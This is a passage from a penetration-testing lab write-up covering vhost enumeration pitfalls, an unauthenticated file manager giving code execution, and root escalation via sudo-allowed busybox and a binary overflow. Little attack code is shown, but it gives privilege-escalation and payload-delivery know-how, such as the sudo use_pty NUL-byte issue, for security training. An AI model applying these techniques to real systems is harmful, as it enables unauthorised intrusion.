                                                  asm-generic headers, one XHTML spec

# what the image actually added at build time
find / -xdev -newermt 2025-01-01 ! -newermt 2025-02-01 -type f | grep -vE '^/(usr|proc|sys|var/lib|…)'
  /var/www/5eEk3r/index.html
  /var/www/crosswords/web/index.php
  /var/www/crosswords/web/styles.css
  /var/www/crosswords/admin/index.php
  /etc/apache2/sites-available/000-default.conf
  /etc/sudoers  /etc/passwd  /etc/shadow  /etc/group  …
```

The build-window diff is decisive: **the image contains exactly the lab's own five web files, one vhost config, and the account database. There is no reward file to find**, and root access does not change that.

I also checked the two places a reward is commonly hidden and are worth recording as *checked and empty*: `/root` holds only `.bashrc`, `.profile`, `.local`, and a `.bash_history` symlinked to `/dev/null` — and `/var/log/apache2/other_vhosts_access.log` is eight build-time lines against the catch-all (lab 26's equivalent file held 21 001 lines of the author's own `Wfuzz` run; here it is 8 lines and they are all `404`/`301`).

**Per `decision-making.md`, the unclosed vector matters more than the absence.** There is no vector I discarded for lack of time. The three real hosts were all reached, both PHP files were read in full, the sudoers file was read in full, and `bs64` was read at the instruction level. The reward is not hidden behind a step I skipped.

---

## 6. Not tested vs discarded with reason

**Not tested** (honest coverage gap):

* **UDP.** `nmap -sU` needs root and is unavailable on this host. Mitigated by an empty `/proc/net/udp` and a single-service entrypoint, but the scan itself was not run.
* **The stored XSS in a real browser.** I proved the payload is served raw and that a live `<script>` tag is in the body. I did not drive a headless browser, so I have not observed script execution in a DOM. Rated as stored script execution in the origin, not as observed cookie theft — and since the lab has no session, there was nothing to steal anyway.
* **Whether `.htaccess` could re-enable more extensions.** `AllowOverride All` is set on both roots, so a `.html` upload could in principle carry a `SetHandler`. Untested; it would not change the severity, which is already full RCE.
* **Post-root persistence and exfiltration.** Root was obtained to prove the finding; I did not modify the target beyond the files I uploaded into the web root.

**Discarded with reason:**

* **Replacing `/usr/bin/busybox`.** The documented sudoers-filesystem oracle. Discarded on measurement: root-owned `0755`, unwritable by `www-data` (§1.2). Not "probably blocked" — tested, and the control held.
* **Payload as an argument to the sudo-allowed command.** `sudo -u astu /usr/bin/busybox <anything>` is permitted, and busybox takes an applet name as `argv[1]`, so `busybox sh -c …` is a legitimate use. What is *not* available is argument injection into a privileged program: every non-`busybox` path returns `sudo: a password is required`.
* **Buffer overflow in `to_base64`.** Its 3-byte group buffer is `-0x50(%rbp)` in a `0x60` frame — 16 bytes for 3, correctly bounded. Reading it was cheaper than testing it.
* **Interpreting `bs64`'s `strings` as the exploit.** Discarded on the disassembly: `main` never calls `fire`.
* **The default vhost as a finding.** It serves the stock Apache page and nothing else. It is the ruler in §2.3, not a discovery.

---

## 7. Design observation — and the one new rule this lab yields

### 7.1 The lab is the counter-example to its own predecessor

Fifteen labs in, the pattern has been that the description is narrative. This one is not: *"fuzzing de subdominios (virtual hosting) y escalada de privilegios en Linux"* is **both halves true**, and unusually the vhosting half is a genuine two-sided lesson.

Lab 26 taught: *a name that responds is not a host.* Six names, six identical normalised hashes, including an invented TLD — the catch-all.

This lab teaches the half lab 26 could not: *a name that responds **differently** is a host, and the obvious name is the decoy.* `admin.5eEk3r.dl` responds `200` and is nothing. `admin.crosswords.5eEk3r.dl` responds `200` and is a file manager with no authentication. **Both answer `200`.** The status code carries zero information; only the body differential does.

A rule observed in one direction is an anecdote. This is now observed in both, and the two halves are what make the discriminator implementable:

* **Direction A (wildcard).** Many names → one hash. The repeated hash is the baseline. Enumerating finds *nothing*; the config file is the only source.
* **Direction B (real vhosting).** Many names → *one* hash for the baseline and *one each* for the real hosts. The singleton hashes are the hosts. Enumerating finds *everything* — including a nested label no wordlist has.

The operational consequence is the part I would want a reader to keep: **in both directions the answer is "count the distinct hashes," but the two directions give opposite verdicts about whether your sweep worked.** A sweep that finds one hash found nothing. A sweep that finds three found everything. The same computation, and the interpretation is where the error happens.

And the trap that makes this lab worth the hours: **the name that looks most like the answer is the wrong one.** Not a decoy planted in the config — a decoy produced by the catch-all, from a name that is not in the configuration at all. No amount of reading the config would have produced `admin.5eEk3r.dl`, and no amount of trusting a wordlist would have found `admin.crosswords.5eEk3r.dl`. Only the body differential, run against a name proven not to exist, distinguishes them.

### 7.2 The new detector — and it is the shape this repository keeps asking for

The advice in circulation is *"normalise and compare body hashes."* It is right, and on this target it **fails on one of the three hosts**, in a way that produces a false negative disguised as a success.

`crosswords.5eEk3r.dl` renders `converts.txt`, which grows on every POST. Three consecutive reads, with a POST between each:

```
before-post #1 crosswords hash=4b7a335063149a97
before-post #2 crosswords hash=cdd9cfc34b4b0cfd
before-post #3 crosswords hash=2890b20b3bbdfd97
```

**Three reads, three hashes, from a host that never changed.** The stock advice says: *if all your hashes differ, your discriminator is wrong, not your hosts.* Here the discriminator is right, the hosts are right, and the **content** is moving. And the stock advice is dangerous here, because "every name returned a different hash" is the *most successful-looking* possible output — it looks like a rich enumeration.

The fix is one control, and it is the same obligation as every other control in this repository: **prove the detector is connected before you believe its output.**

```
# read each host three times with NO writes in between
after-post #1 crosswords hash=161f8b02abdec038
after-post #2 crosswords hash=161f8b02abdec038
after-post #3 crosswords hash=161f8b02abdec038
after-post #1 admin     hash=d27ab5a7e81c580d
after-post #2 admin     hash=d27ab5a7e81c580d
```

Three identical hashes once the writes stop. The static baseline `f7cca221daa35bdc` was **byte-identical before and after the entire engagement**, including after I had uploaded a dozen files into the tree.

So the rule, and it cannot fail in its incorrect form:

> **A body-hash vhost discriminator must be preceded by a stability control: read each candidate host N times with no writes, and require the hash to repeat. A host whose hash moves is a host with dynamic content and is not thereby a different host; a host whose hash is stable and differs from the baseline is a real host. Only after stability is established does "all hashes differ" become a signal that the *discriminator* is wrong.**

This is `decision-making.md`'s *"a detector pointed at something that does not exist returns a clean, believable negative"* — with the twist that makes it worse. That one returns a **false negative**; this one returns a **false positive**, dressed as a successful enumeration, and the natural reading of the output ("I found many distinct hosts!") is the opposite of the truth. It is also a *content*-class sibling of the XSS disclosure-surface trichotomy: reachability was never in question, the body was what misreported, and the difference between "a value" and "a moving value" is the difference between a finding and a fabricated one.

### 7.3 The sudoers-PTY defect, which generalises past exploitation

`Defaults use_pty` in `/etc/sudoers` — one line, present on most Debian-family hosts — silently drops NUL bytes from anything written to a `sudo`'d command's stdin, because a canonical-mode PTY discards them.

I lost a full diagnostic cycle to it, and the symptom is maximally misleading: **the exploit works perfectly under `gdb`, because `gdb` redirects stdin from a file.** So the debugger confirms the payload is correct while the live run fails, and the natural conclusion — *my offset is wrong* — sends you back to the frame layout, which was right all along. Two unrelated causes produced one identical symptom.

The rule: **a binary payload must be delivered over a channel that is provably byte-transparent, and the proof is `od`-ing what the far end received.** A pipe is byte-transparent; a canonical-mode PTY is not; a FIFO is byte-transparent; `expect` is not. When an exploit's behaviour differs between a debugger and a live shell, **the transport is the first thing to suspect**, before the payload, because the debugger is the one context where the two environments are guaranteed to differ.

This is the same shape as the repository's relay-and-source-port rule, and it is the second instance of a transport that is invisible in the output and silently changes the bytes.

---

## 8. What this lab adds to the methodology

1. **The vhost rule, now with both directions.** Wildcard confirmed in lab 26; real vhosting confirmed here, with the flat-`admin`-is-a-decoy case that a wordlist cannot solve. Same computation, opposite verdicts — §7.1.
2. **The hash-stability control**, §7.2. New, and it is the first detector in this repository's catalogue whose incorrect form produces a *false positive* that reads as success.
3. **A privileged-tool contamination rule**, §1.2. *Any* filesystem-control claim in a privilege-escalation finding must name the identity that was tested, because the tools an assessor reaches for — `docker exec`, `kubectl exec`, root Burp — always report the privileged answer. Generalises the existing execution-identity rule from RCE to escalation.
4. **The byte-transparent-delivery rule**, §7.3. `sudo`'s `use_pty` is a one-line default that silently corrupts binary payloads, and a debugger masks it.
5. **An exit status is not a verdict.** `RC=139` after a successful root shell is `fire` crashing *after* `system()` returned. Reading the exit code of a corrupting exploit as its success criterion sends you to re-debug a working exploit — the mirror image of *an error oracle with N indistinguishable outcomes*, one level out.
6. **`fire` is a label too.** `strings` said `Ejecutando /bin/sh`; `main` never calls `fire`. Fifteenth confirmation that a self-documenting artefact is a stopping condition, and the first time the label was on a *function the compiler kept but the program never calls* — which is why it is more convincing than a comment, and more wrong.
